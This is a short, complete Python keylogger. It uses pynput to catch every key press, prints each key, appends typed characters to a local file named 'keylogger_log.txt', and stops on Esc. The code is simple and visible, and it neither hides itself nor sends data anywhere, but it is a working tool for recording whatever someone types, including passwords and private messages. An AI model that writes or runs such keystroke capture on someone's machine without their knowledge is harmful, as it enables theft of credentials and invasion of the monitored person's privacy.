
import os
from pynput.keyboard import Key, Listener


def my_on_press(key):
    print("{} pressed!".format(key))
    write_text_file(key)


def my_on_release(key):
    if key == Key.esc:
        return False

def write_text_file(key):

    if not os.path.exists("keylogger_log.txt"):
        with open("keylogger_log.txt", "w") as f:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            if k.find("Key") == -1:
                f.write(str(k))

    else:
        with open("keylogger_log.txt", "a") as f:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            if k.find("Key") == -1:
                f.write(str(k))


with Listener(on_press=my_on_press, on_release=my_on_release) as listener:
    listener.join()
